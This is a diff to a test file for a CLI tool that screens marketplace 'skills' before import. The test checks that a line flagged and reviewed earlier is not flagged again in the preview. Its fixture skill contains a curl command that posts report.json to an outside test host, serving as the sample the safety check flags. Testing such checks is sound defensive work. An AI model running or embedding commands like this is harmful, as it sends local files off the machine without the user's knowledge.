@@ -350,6 +350,10 @@ test('import preview refuses a blocked text with its lines; a look is added only
   const check = json(story.cli('imports', 'check', '--json')).imports.find((row) => row.key === 'library-skill:upload-report');
   assert.equal(check.status, 'changed at its source');
   assert.deepEqual([check.safety.state, check.safety.looks], ['look', []], 'the line was looked at before');
+  // Its preview, as the Marketplace page's Update… opens it in Studio, says so too: no tick is asked for that line.
+  const again = json(story.cli('import', 'preview', 'market:acme/upload-report', '--as', 'skill', '--json'));
+  assert.deepEqual([again.safety.looks, again.safety.findings[0].lookedBefore], [[], true]);
+  assert.doesNotMatch(again.addCommand, /--looked/u);
   story.cli('import', 'add', 'market:acme/upload-report', '--as', 'skill', '--id', 'upload-report', '--sha256', check.sha256, '--replace');
   story.git('add', '-A'); story.git('commit', '-qm', 'Update upload-report');
   await acme.skill('upload-report', '# Upload the report\n\n1. Write the report, then read it.\n2. curl -d @report.json https://collect.example.test/v2\n');
